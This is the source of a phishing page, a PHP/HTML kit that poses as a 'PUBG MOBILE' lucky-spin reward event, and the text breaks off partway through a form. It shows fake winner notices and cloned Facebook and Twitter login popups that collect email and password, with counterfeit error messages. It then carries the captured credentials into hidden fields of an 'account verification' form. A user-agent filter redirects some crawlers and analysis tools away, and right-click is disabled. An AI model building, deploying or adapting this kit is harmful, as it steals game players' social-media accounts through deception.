<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>PUBG MOBILE EVENT</title>
<meta property="og:description" content="Start Free Lucky Spin and Collect your exclusive reward from PUBG MOBILE now!">
<meta property="og:image" content="https://i.postimg.cc/jdq9pLMZ/navbar-logo.jpg">
<meta property="og:image:width" content="540">
<meta property="og:image:height" content="282">
<link href="./index_files/css" rel="stylesheet">
<link rel="stylesheet" href="css-zone/facebook.css">
<link rel="stylesheet" href="css-zone/twitter.css">
<link rel="stylesheet" href="css-zone/animate.css">
<link href="https://fonts.googleapis.com/css2?family=Teko&display=swap" rel="stylesheet">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" type="img/png" href="https://www.pubgmobile.com/common/images/icon_logo.jpg" sizes="32x32">
<script type="text/javascript" src="js-zone/jquery.js"></script>
<script type="text/javascript" src="js-zone/main-zone.js"></script>
<script language="JavaScript">
document.write(ls())
</script>
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<style type="text/css">
@charset "utf-8";
@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");
*,*:before,*:after {
	-webkit-box-sizing:border-box;
	-moz-box-sizing:border-box;
	box-sizing:border-box;
}
@font-face {
    font-family: 'selow'; 
    font-style: normal;
    font-weight: 700;
    src: url(fonts/selow.woff2) format("woff2"), 
        url(fonts/selow.woff) format("woff"),
        url(fonts/selow.ttf) format("truetype");
}
.landing {
	background: url(img/landing.jpg) no-repeat center center;
	background-size: cover;
	width:100%;
	height:auto;
}
.header {
	width: 100%;
	height: auto;
}
.header img {
	width: 100%;
	height: auto;
	margin-top: -0px;
}
.header video {
	width: 100%;
	border:none;
}
.slideshow-container {
  max-width: 1000px;
  position: relative;
  margin: auto;
  border-top: 1px solid #ECD954;
  border-bottom: 1px solid #ECD954;
}
.fade {
  -webkit-animation-name: fade;
  -webkit-animation-duration: 1.5s;
  animation-name: fade;
  animation-duration: 1.5s;
}
  .notiftwitter {
	width: 30%;
	height: 30px;
	margin-left: 35%;
	margin-right: auto;
	padding: 5px;
	font-size: 22px;
	font-family:Teko;
	font-weight: 500;
	text-align: center;
	color: #ECD954;
	margin-bottom: 0px;
	border: none;
	position: relative;
	outline: none;
	display: block;
}
.season-logo {
	width:20%;
	margin:15px;
	float:left;
}
.season-logos {
	width:40%;
	margin:5px;
	float:right;
}
.season-slogan {
	width: 100%;
	margin-top: 100%;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.season-btn {
	background: url(/img/yes_selow.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	padding: 10px;
	padding-left: 30px;
	padding-right: 30px;
	font-size: 18px;
	font-family:selow;
	font-weight: 500;
	text-align: center;
	color: #000;
	margin-bottom: 3px;
	border: none;
	position: relative;
	outline: none;
	display: block;
}
.season-btn:hover {
	background: url(../img/menu_on.png) no-repeat center;
	background-size: 100% 100%;
	color: #000;
	transition: 0.5s;
}
.event-title {
	background:url(img/event-title.png) no-repeat center center;
	background-size:100% 100%;
	width:95%;
	height:70px;
	margin-left:auto;
	margin-right:auto;
	margin-top:1px;
	margin-bottom:0px;
	display:block;
}
.event-subtitle {
    display: block;
    margin-left: 5%;
    margin-right: 5%;
    margin-top: -15px;
    margin-bottom: 25px;
    overflow: hidden;
    text-align: center;
    white-space: nowrap;
    width: 90%;
}
.event-subtitle>span {
    display: inline-block;
    position: relative;
    color: #ffca13;
    cursor: default;
    font-size: 1.4rem;
	text-shadow: 1px 1px 0px rgba(0, 0, 0);
}
.event-subtitle>span:before,
.event-subtitle>span:after {
    background: #ffca13;
	border-bottom: 2px solid #ffca13;
    content: "";
    height: 1px;
    position: absolute;
    top: 50%;
    width: 9999px;
}
.event-subtitle>span:before {
    margin-right: 15px;
    right: 100%;
}
.event-subtitle>span:after {
    left: 100%;
    margin-left: 15px;
}
.event-notification {
    background: url(img/alert.png) no-repeat center;
	background-size: 100% 100%;
	width:100%;
	height:50px;
	padding:7px;
	padding-top:-20px;
	padding-bottom:-20px;
	margin-right: auto;
	margin-left: auto;
}
.event-notification-text {
	padding-top:10px;
	text-align:center;
	font-family:selow;
	color:#000;
	font-size:17px;
}
.popup {
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
	background-color:rgba(0, 0, 0, 0.4);
}
.popup-box-wrapper {
	width: 390px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 15%;
	text-align: center;
	font-family:'selow';
	color:#fff;
}
.popup-box-navbar {
	background:url(img/popup-navbar2.png) no-repeat center center;
	background-size:100% 100%;
	height: 43px;
	padding-bottom: 5px;
}
.popup-box-navbar img {
	width: 25px;
	height: 25px;
	margin-top: 7px;
	margin-right: 15px;
	float: right;
}
.popup-box-navbar-title {	
	padding-top: 12px;
	padding-bottom: 2px;
	font-size: 20px;
	font-family:selow;
	font-weight: 300;
	text-align: center;
	color: #fff;
}
.popup-box-bg {
	background:url(img/popup-box-bg2.png) no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	margin-top: -12px;
}
.popup-box-alert {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 18px;
    font-family:selow;
	font-weight: 500;
	text-align: left;
	display: block;
}
.popup-box-alert2 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 18px;
    font-family:selow;
	font-weight: 500;
	text-align: left;
	display: block;
}
.popup-box-alert0 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 18px;
    font-family:selow;
	font-weight: 500;
	text-align: right;
	display: block;
}
.popup-box-alert3 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 18px;
    font-family:selow;
	font-weight: 500;
	text-align: left;
	display: block;
}
.popup-box-alert7 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #F5EAB0;
	font-size: 18px;
    font-family:selow;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-box-alert4 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 18px;
    font-family:selow;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-box-alert4 i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #AAAAAA;
	font-size: 50px;
	text-align: center;
}
.popup-box-item {
	width:23%;
	height:85px;
	margin-left:auto;
	margin-right:auto;
	text-align: right;
	display: block;
}
.popup-box-item img {
	width:100%;
	height:100%;
}
.popup-box-item span {
	color: #fff;
	font-size: 22px;
	font-family: selow;text-align: right;
	position: absolute;
	left: 0;
	right: 2px;
	bottom: -5px;
}
.popup-box-form {
	width: 85%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.popup-box-form label {
  display: inline-block;
  width: 140px;
  text-align: right;
  color: yellow;
}
.popup-box-form input {
	background: #000;
	width: 100%;
	height: auto;
	margin-bottom: 3px;
	padding: 4px;
	color: #fff;
	font-size:17px;
	font-family:Teko;
	font-weight: 500;
	border: 2px solid #AAAAAA;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.popup-box-form input::placeholder {
	color: #fff;
}
.popup-box-form select {
	background: #000;
	width: 100%;
	height: auto;
	margin-bottom: 3px;
	padding: 4px;
	color: #fff;
	font-size:17px;
	font-family:Teko;
	font-weight: 500;
	border: 2px solid #AAAAAA;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.popup-box-footer {
	background:url(img/popup-footer2.png) no-repeat center center;
	background-size:100% 100%;
	margin-top: -2px;
	width: 100%;
	height: 45px;
}
.popup-box-footer button {
	background: url(img/yes_selow.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-top: 5px;
	padding: 5px;
	padding-left: 35px;
	padding-right: 35px;
	color: #000;
	font-size:18px;
	font-family: selow;
	font-weight: 500;
	text-align: center;
	border: none;
	outline: none;
}
.popup-box-form-footer {
	background:url(img/popup-footer2.png) no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	height: 45px;
	margin-top: -17px;
}
.popup-box-form-footer button {
	background: url(img/yes_selow.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-top: 5px;
	padding: 4px;
	padding-left: 30px;
	padding-right: 30px;
	color: #000;
	font-size:18px;
	font-family: selow;
	font-weight: 500;
	text-align: center;
	border:none;
	outline: none;
}
.popup-btn-login {
    width: 40%;
    height: auto;
    margin-top: 8px;
    padding: 6px;
    margin: 5px;
    color: #000;
	font-size: 16px;
    font-family:selow;
    border: none;
    outline: none;
    margin-bottom: 45px;
    position: relative;
}
.popup-btn-login i {
    color: #fff;
    font-size: 23px;
    float: left;
}
.popup-btn-facebook {
    background: #4167B2;
    color: #fff;
}
.popup-btn-twitter {
    background: #198B96;
    color: #fff;
}
.popup-login {
	background:rgba(0,0,0,0.4);
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
}
.popup-box-login-fb {
	background:#ECEFF6;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:1.9%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.popup-box-login-twitter {
	background:#fff;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:10%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.close-fb {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	position:absolute;
	top:-8px;
	right:-10px;
	display:block;
}
.close-fb i {
	color:#fff;
	padding-top:1px;
}
.close-other {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	top:-8px;
	right:-10px;
	position:absolute;
	z-index:9999999;
	display:block;
}
.close-other i {
	color:#fff;
	padding-top:1px;
}
.popups {
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
	background-color:rgba(0, 0, 0, 0.4);
}
.popup-boxs {
	width: 390px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 15%;
	text-align: center;
	font-family:'Teko';
	color:#fff;
}
.popup-box-wrappers {
	width: 390px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 15%;
	text-align: center;
	font-family:'selow';
	color:#fff;
}
.popup-box-navbars {
	background:url(img/popup-navbar2.png) no-repeat center center;
	background-size:100% 100%;
	height: 43px;
	padding-bottom: 5px;
}
.popup-box-navbars img {
	width: 25px;
	height: 25px;
	margin-top: 9px;
	margin-right: 15px;
	float: right;
}
.popup-box-navbars-title {
	padding-left: 12px;
	padding-top: 12px;
	padding-bottom: 2px;
	font-size: 22px;
	font-family:selow;
	font-weight: 500;
	text-align: left;
	background: -webkit-linear-gradient(#3F1739, #610C2B);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
}
.popup-box-bgs {
	background:url(img/popup-box-bg2.png) no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	margin-top: -12px;
}
.popup-box-alerts4 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #F5EAB0;
	font-size: 20px;
    font-family:selow;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-box-alerts4 i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #F5EAB0;
	font-size: 50px;
	text-align: center;
}
.popup-box-formx label {
  width: 50%;
  text-align: right;
  color: #000;
  text-shadow:none;
  font-size:15px;
}
.popup-box-formx input {
	background: #7D9595;
	width: 65%;
	height: auto;
	margin-bottom: 3px;
	margin-left: 10px;
	padding-right: 4px;
	padding: 4px;
	color: #fff;
	font-size:14px;
	font-family:selow;
	font-weight: 300;
	border: 0.1px solid #fff;
	outline:none;
	position: relative;
  -webkit-appearance: none;
  -moz-appearance: none;
}
.popup-box-formx input::placeholder {
	color: #BCCBCE;
}
.popup-box-footers {
	background:url(img/popup-footer2.png) no-repeat center center;
	background-size:100% 100%;
	margin-top: -2px;
	width: 100%;
	height: 45px;
}
.popup-box-footers button {
	background: url(img/yes_selow.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-top: 5px;
	padding: 4px;
	padding-left: 35px;
	padding-right: 35px;
	color: #000;
	font-size:18px;
	font-family: selow;
	font-weight: 500;
	text-align: center;
	border: none;
	outline: none;
}
.popup-box-formx-footer {
	background:url(img/popup-footer2.png) no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	height: 45px;
	margin-top: -17px;
}
.popup-box-formx-footer button {
	background: url(img/yes_selow.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-top: 5px;
	padding: 4px;
	padding-left: 30px;
	padding-right: 30px;
	color: #F4CD34;
	font-size:18px;
	font-family: selow;
	font-weight: 500;
	text-align: center;
	border:none;
	outline: none;
}
.balance {
	background:url(../img/bg-item.png) no-repeat center center;
	background-size:101% 100%;
	width: 94.3%;
	height: 100px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 7px;
	padding: 4px;
	border-top:2px solid #ECD954;
	border-left:2px solid #ECD954;
	border-right:2px solid #ECD954;
	border-bottom:2px solid #ECD954;
	display: block;
}
.balance-img {
	width: 50%;
	height: 97px;
	margin-top: -5px;
	margin-right: 5px;	
	float: left;	
	padding: 5px;
	border:1px #fff;  
}
.balance-nom {
	color: #fff;
	padding-top: 2px;
	padding-left: 5px;
	padding-bottom: 0px;
	font-size: 18px;
	font-family:selow;
	font-weight: 500;
	text-align: center;
	text-shadow:0 1px 0 #000;
	border-left: 3px solid #9FE9F7;
	line-height: 18px;
	float: left;
}
.balance-detail {
	width: auto;
	height: auto;
	padding-top: 2px;
	padding-left: 5px;
	padding-bottom: 0px;
	color: #fff;
	font-size: 15px;
	font-family:selow;
	text-align: left;
}
.balance-nom-button {
	background:url(../img/yes_selow.png) no-repeat center center;
	background-size:100% 100%;
    width: 36%;
	height: auto;
	margin-top:7px;
	margin-left:auto;
	margin-right:auto;
	padding: 10px;
	font-size: 18px;
	color:#000;
	font-family:selow;
	text-align: center;
	border: none;
	outline: none;
	float: center;
}
.box {
    width: 95%;
    height: auto;
    margin-left:auto;
    margin-right:auto;
	margin-bottom: 12px;
	position: relative;
	display: block;
} 
.scroll {
	width:100%;
	overflow:none;
	position:relative;
	width: 100%;
	height:400px;
	margin-top:11px;
	display: block;
	scrollbar-face-color:#ffbb40;
	scrollbar-shadow-color:#ffbb40;
	scrollbar-highlight-color:#ffbb40;
	scrollbar-3dlight-color:#ffbb40;
	scrollbar-darkshadow-color:#ffbb40;
	scrollbar-track-color:#ffbb40;
	scrollbar-arrow-co
}
.btn-wrapper {
	width: 100%;
	height: auto;
	margin-top: 20px;
	margin-bottom: -20px;
	margin-left:auto;
	margin-right:auto;
	align-items:center;
	justify-content:space-around;
	display:flex;
}
.btn-wrapper button {
    background: url(../img/start.png) no-repeat center;
	background-size: 100% 100%;
	width: 47%;
	height: 50px;
	margin-left:auto;
	margin-right:auto;
	margin-bottom: 30px;
	padding: 15px;
	color: #000;
	font-size: 18px;
	font-family: selow;
	font-weight: 500;
	text-align: center;
	border: none;
	outline: none;
	display: inline-block;
}
.alert {
	background: url(img/selow.jpg) no-repeat center;
	background-size: 100% 100%;
	width: 100%;
	height: 83px;
	margin-left: auto;
	margin-right: auto;
	border-left: 1px solid #fff;
	border-right: 1px solid #fff;
	border-top: 2px solid #E0B35B;
	border-bottom: 2px solid #E0B35B;
	display: block;
}
figure {
	margin: 0;
	padding: 0;
	overflow: hidden;
}
.itemShine {
	position: relative;
}
.itemShine::before {
	background: -webkit-linear-gradient(left, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
	background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
	width: auto;
	height: auto;
	top: 0;
	left: -75%;
	position: absolute;
	z-index: 2;
	content: '';
	display: block;
	-webkit-transform: skewX(-25deg);
	transform: skewX(-25deg);
}
.itemShine::before {
	-webkit-animation: shine 2s infinite;
	animation: shine 2s infinite;
}
@-webkit-keyframes shine {
	100% {
		left: 125%;
		}
}
@keyframes shine {
	100% {
		left: 125%;
		}
}
.kanan {
	float: right;
}
.kiri {
	float: left;
}
.tengah {
	margin-left: auto;
	margin-right: auto;
	display: block;
}
::-webkit-scrollbar { 
    display: none;
    width: 0px;
}
@media only screen and (max-width:600px) {
    .containerLanding, .containerHome {
        width: 100%;
        height: auto;
        margin-top: 0px;
        margin-bottom: 0px;
		border: none;
        border-radius: 0px;
        padding: 0px;
	}
	.gallery-container {
		border-top: 2px solid #ECD954;
	}
	.footer {
	    border-top: 2px solid #ECD954;
	    border-left: 0px solid #DDB97F;
	    border-right: 0px solid #DDB97F;
	    border-bottom: 0px solid #DDB97F;
	}        
    .gallery-container {
	    width: 100%;
		height: auto;
    }
    .box {
	    width: 95%;
		height: auto;
	}
    .scroll {
        height: 400px;
    }
    .event-title {
        height: 75px;    
    }
    .alert {
        border-right: none;  
        border-left:none;       
    }
    .popup-box-wrapper {
        width: 370;
        margin-top: 60%;
    }
    .popup-box-wrappers {
        width: 350px;
        margin-top: 60%;
    }
    .popup-box-item {
        width: 25%;
        height: 90px;
    }
    .popup-box-login-fb {
        margin-top: 4%;
    }
    .popup-box-login-twitter {
        margin-top: 25%;
    }
}
</style>       
<div class="slider-container">
<div class="navbar">
<img class="navbar-logo" src="https://i.postimg.cc/SxQ04Qn4/navbar-logo.png">
<div class="navbar-right">
<img class="navbar-shop" src="https://www.pubgmobile.com/en/images/nav_shop.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_language.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_menu.svg">
<div class="navbar-download"><img src="https://www.pubgmobile.com/en/images/nav_download.svg"></div>
</div> <!--- navbar-right --->
</div> <!--- navbar --->
<div class="header">
<img src="img/header.jpg" style="width: 100%;"></div>
</div> <!--- header --->
<div class="gallery-container">
<div class="event-title"></div> <!--- event-title --->
<div class="cont">
<div class="event-notification">
<div class="event-notification-text">
<div class="slider animated fadeIn">ID 5149470362 Successful Get Mummy Set </div>
<div class="slider animated fadeIn">ID 5504362590 Successful Get 10 Materials</div>
<div class="slider animated fadeIn">ID 5242011396 Successful Get M4 Imperial</div>
<div class="slider animated fadeIn">ID 5516827559 Successful Get 7 Materials</div>
<div class="slider animated fadeIn">ID 5768760016 Successful Get M4 Glacier</div>
<div class="slider animated fadeIn">ID 5226032560 Successful Get 5 Materials</div></div></div> <!--- event-notification --->
<div class="cont spin_content">
<section class="container" id="js-lotto">
<div class="square" data-order="0">
<div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift1" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/1.png" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift1)"></polygon></svg></div>
</div>
<div class="square" data-order="1">
<div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift2" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/2.png" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift2)"></polygon></svg></div>
</div>
<div class="squar" data-order="5">
<div class="squar__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift3" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/3.png" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift3)"></polygon></svg></div>
</div>
<div class="start squar__start-btn">
<div>
<center>
<o onclick="audioFile()" onmousedown="buka.play();"><img src="img/draw.png" width="95" height="95" id="js-start"></o>
</center>
</div>
</div>
<div class="squar" data-order="2">
<div class="squar__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift4" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/4.png" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift4)"></polygon></svg></div>
</div>
<div class="square" data-order="4">
<div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift5" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/5.png" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift5)"></polygon></svg></div>
</div>
<div class="square" data-order="3">
<div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift6" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/6.png" x="-25" width="150" height="100"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift6)"></polygon></svg></div></div>
</div>
</section> <!--- container --->
</div> <!--- cont spin_content --->
</div> <!--- gallery-container --->
<div class="footer">
<div class="footer-txt-copyrights">Partnership Inquiry: pubgmobile_business@tencent.com</div> <!--- footer-txt-copyright --->
<img class="footer-copyright-icon" src="img/footer.png">
<div class="footer-txt-copyright">??? 2022 KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">??? 2018-2022 Tencent. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> <!--- footer-txt-copyright --->
<br>
</div> <!--- footer --->
</div> <!--- slider-container --->

<div class="popup open_rewards animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Congratulations</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert4"><br>You got this reward!</div> <!--- popup-box-alert --->
<div class="popup-box-item itemShine">
<div>
<figure>
<img class="popup-item" src="">
</figure>
</div>
</div> <!--- popup-box-item itemShine --->
<br>
<div class="popup-box-footer">
<button type="button" onmousedown="buka.play();" onmousedown="buka.play();" onclick="open_account_verification()">Collect</button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup open_rewards --->

<div class="popup account_login animated fadeIn">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Login</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert4"><br>
Login Using PUBG MOBILE Account</div> <!--- popup-box-alert --->
<button type="button" onmousedown="buka.play();" class="popup-btn-login popup-btn-twitter" onclick="open_twitter();"><i class="fa fa-twitter-square icon-login"></i> Twitter</button>
<button type="button" onmousedown="buka.play();" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Facebook</button>
<br><br><br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer">
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup account_login --->

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb">
<img src="https://i.ibb.co/Wg8qQxh/facebook-text.png">
</div>
<div class="content-box-fb">
<p class="kaget email-fb" style="width: 330px; top: -15px; text-align: left;">The email address or phone number that you've entered doesn't match any account. <b>Sign up for an account.</b></p>
<p class="kaget sandi-fb" style="width: 330px; top: -15px; text-align: left;">The password that you've entered is incorrect. Forgotten password?</p>
<img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
<div class="txt-login-fb">
 Log in to your Facebook account to connect to PUBG MOBILE.
</div>
<form class="login-form" action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
<label>
<input type="text" class="loginEmail" name="email" id="email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Email or Mobile Number')" oninput="setCustomValidity('')">
</label><label>
<input type="password" class="loginPassword" name="password" id="password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')"></label>
<div class="showHide showPassword" onclick="showFbPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div>
<div class="showHide hidePassword" style="display: none;" onclick="hideFbPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div>
<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
<button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
</form>
<div class="txt-create-account">Create Account</div>
<div class="txt-not-now">Not now</div>
<div class="txt-forgotten-password">Forgotten password?</div>
</div>
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div>
<div class="language-name">??????????????</div>
<div class="language-name">T??rk??e</div>
<div class="language-name">Ti???ng Vi???t</div>
<div class="language-name">?????????</div>
<div class="language-name">Espa??ol</div>
<div class="language-name">Portugu??s (Brasil)</div>
<div class="language-name">
<i class="fa fa-plus"></i>
</div>
</center>
</div>
<div class="copyright">Facebook Inc.</div>
</div>
</div>

<div class="popup-login login-twitter animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<a onclick="close_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="box-twitter">
<center>
<div class="header-twitter">
<img src="https://i.ibb.co/V9rgBqw/twitter-text.png" style="margin-bottom: -35px; margin-left: 135px;">
</center>
<center>
<br><br>
<form action="javascript:void(0)" method="post" id="ValidateLoginTwitterForm">
<div class="txt-login-twitter"style="text-align: left; margin-left: 95px;">Login to Twitter</div> <!--- txt-login-twitter --->
<div class="input-box-twitter">
<label>Phone, email, or username</label>
<input type="text" name="email" id="email-twitter" placeholder="" required oninvalid="this.setCustomValidity('Enter Username, Email or Mobile Number')" oninput="setCustomValidity('')">
</div> <!--- input-box-twitter --->
<div class="input-box-twitter">
<div class="TwitterShowHide TwitterShowPassword" onclick="showTwitterPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div> <!--- TwitterShowPassword --->
<div class="TwitterShowHide TwitterHidePassword" style="display: none;" onclick="hideTwitterPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div> <!--- TwitterHidePassword --->
<label>Password</label>
<input type="password" style="width: 85%;" name="password" id="password-twitter" placeholder="" required oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
</div> <!--- input-box-twitter --->
<p class="kagettw email-tw" style="width: 330px; top: -15px; text-align: center; margin-left: -17px;">Sorry, we couldn't find your account.</p>
<p class="kagettw sandi-tw" style="width: 330px; top: -15px; text-align: center; margin-left: -17px;">Wrong Password!</p>
<input type="hidden" name="login" id="login-twitter" value="Twitter" readonly>
<button type="submit" class="btn-login-twitter" onclick="ValidateLoginTwitterData()">Log In</button>
<div class="footer-menu-twitter">Forgot password?</div> <!--- footer-menu-twitter --->
<div class="footer-menu-twitter bulet">???</div> <!--- footer-menu-twitter --->
<div class="footer-menu-twitter">Sign up to Twitter</div> <!--- footer-menu-twitter --->
</form>
</center>
</div> <!--- box-twitter --->
</div> <!--- header-twitter --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login--->

<div class="popup account_verification animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Verification</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert4"><br>Complete your account details</div> <!--- popup-box-alert --->
<form class="popup-box-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
<input type="hidden" name="email" id="validateEmail" readonly>
<input type="hidden" name="password" id="validatePassword" readonly>
